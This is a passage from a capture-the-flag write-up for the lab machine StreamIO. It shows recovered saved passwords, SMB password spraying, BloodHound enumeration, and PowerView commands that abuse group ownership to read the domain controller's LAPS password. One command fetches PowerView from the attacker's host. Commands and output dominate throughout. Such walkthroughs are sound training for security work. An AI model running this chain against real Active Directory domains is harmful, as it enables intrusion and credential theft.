[+] Password found !!!
URL: https://slack.streamio.htb
Login: JDgodd
Password: password@12

[+] Password found !!!
URL: https://slack.streamio.htb
Login: yoshihide
Password: paddpadd@12

[+] Password found !!!
URL: https://slack.streamio.htb
Login: admin
Password: JDg0dd1s@d0p3cr3@t0r

[+] Password found !!!
URL: https://slack.streamio.htb
Login: nikk37
Password: n1kk1sd0p3t00:)


[+] 4 passwords have been found.
For more information launch it again with the -v option

elapsed time = 0.14062094688415527
```

- Let's check creds 
  - We know the passwords for `nikk37` and `yoshihide`
  - So we check the creds for `admin` and `JDgodd`
```
└─$ crackmapexec smb 10.10.11.158 -u user.list -p pass.list --continue-on-success               
SMB         10.10.11.158    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:password@12 STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:paddpadd@12 STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\JDgodd:password@12 STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\JDgodd:paddpadd@12 STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\JDgodd:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE 
```

- Now we have another user
  - `JDgodd:JDg0dd1s@d0p3cr3@t0r`
  - But we can't `winrm`, since he doesn't have privileges
```
*Evil-WinRM* PS C:\users\nikk37> net user JDgodd
User name                    JDgodd
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/22/2022 2:56:42 AM
Password expires             Never
Password changeable          2/23/2022 2:56:42 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   9/20/2023 5:24:58 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users
The command completed successfully.
```
## Root
- Let's enumerate the domain using `bloodhound`
```
└─$ bloodhound-python -c all -u 'JDgodd' -p 'JDg0dd1s@d0p3cr3@t0r' -d streamio.htb -dc streamio.htb -ns 10.10.11.158 --zip
INFO: Found AD domain: streamio.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: streamio.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: streamio.htb
INFO: Found 8 users
INFO: Found 54 groups
INFO: Found 4 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.streamIO.htb
INFO: Done in 00M 24S
INFO: Compressing output into 20230920182850_bloodhound.zip

```

- We have `WriteOwner` over `Core Staff` which can read `LAPS` password of `DC`

![](./images/28.png)

- Let's upload `powerview` and perform our attack
  - https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writeowner
  - https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces#writeowner-on-group
```
*Evil-WinRM* PS C:\users\nikk37> wget 10.10.16.6/powerview.ps1 -outfile powerview.ps1
*Evil-WinRM* PS C:\users\nikk37> . .\powerview.ps1
*Evil-WinRM* PS C:\users\nikk37> $password = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
*Evil-WinRM* PS C:\users\nikk37> $creds = New-Object System.Management.Automation.PSCredential('JDgodd', $password)
*Evil-WinRM* PS C:\users\nikk37> Set-DomainObjectOwner -Identity 'Core Staff' -OwnerIdentity 'JDgodd' -Credential $creds
*Evil-WinRM* PS C:\users\nikk37> Add-DomainObjectAcl -Credential $creds -TargetIdentity 'Core Staff' -PrincipalIdentity 'JDgodd'
*Evil-WinRM* PS C:\users\nikk37> Add-DomainGroupMember -Credential $creds -Identity 'Core Staff' -Members 'JDgodd'
*Evil-WinRM* PS C:\users\nikk37> net user jdgodd
User name                    JDgodd
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/22/2022 2:56:42 AM
Password expires             Never
Password changeable          2/23/2022 2:56:42 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   9/20/2023 5:41:37 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *CORE STAFF
The command completed successfully.

*Evil-WinRM* PS C:\users\nikk37> Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $creds


DistinguishedName : CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb
DNSHostName       : DC.streamIO.htb
Enabled           : True
ms-Mcs-AdmPwd     : 9-{dc@T0rG5lp1
Name              : DC
ObjectClass       : computer
ObjectGUID        : 8c0f9a80-aaab-4a78-9e0d-7a4158d8b9ee
SamAccountName    : DC$
SID               : S-1-5-21-1470860369-1569627196-4264678630-1000
UserPrincipalName :

```

- Now we can `wirnm` as `administrator`

![](./images/29.png)

- The flag is located in `Martin`'s desktop
```
*Evil-WinRM* PS C:\users> gci -include root.txt -recurse -path .


    Directory: C:\users\Martin\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/20/2023   4:46 PM             34 root.txt

```

- Apparently we could also retrieve `LAPS` password via `crackmapexec`
```
└─$ crackmapexec smb 10.10.11.158 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' --laps --ntds
SMB         10.10.11.158    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.158    445    DC               [-] DC\administrator:9-{dc@T0rG5lp1 STATUS_LOGON_FAILURE 
```